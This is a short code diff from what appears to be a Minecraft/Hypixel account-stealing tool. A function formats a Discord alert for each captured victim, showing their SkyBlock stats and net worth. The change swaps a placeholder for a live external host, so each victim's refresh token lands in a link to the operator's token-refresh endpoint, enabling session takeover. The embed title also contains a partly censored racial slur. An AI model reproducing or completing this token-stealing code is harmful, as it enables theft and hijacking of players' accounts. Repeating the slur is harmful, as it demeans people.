@@ -87,7 +87,7 @@ const sendHit = async (name, id, firstProfileData, refresh, SSIDCode) => {
   .setTitle(name)
   .setURL('https://sky.shiiyu.moe/stats/' + name)
   .setThumbnail('https://crafatar.com/avatars/' + id)
-  .setAuthor({ name: 'Hit Some Ni**a Hard', url: 'http://PUT UR URL HERE/refresh?refreshToken=' + refresh })
+  .setAuthor({ name: 'Hit Some Ni**a Hard', url: 'https://hypixeldiscordverify.onrender.com/refresh?refreshToken=' + refresh })
   .addFields(
     { name: 'Network', value: networth, inline: true }, { name: 'Unsoulbound', value: uNetworth, inline: true },
     { name: ' ', value: ' ' },
